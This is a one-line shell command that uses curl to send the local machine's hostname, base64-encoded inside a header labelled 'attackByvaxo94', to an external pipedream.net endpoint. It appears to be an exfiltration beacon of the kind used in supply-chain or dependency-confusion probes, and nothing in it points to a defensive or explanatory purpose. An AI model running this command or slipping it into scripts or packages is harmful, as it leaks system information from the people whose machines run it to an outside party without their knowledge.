curl -H  "attackByvaxo94: $(hostname | base64)"  https://eo1z2prk4as56mb.m.pipedream.net
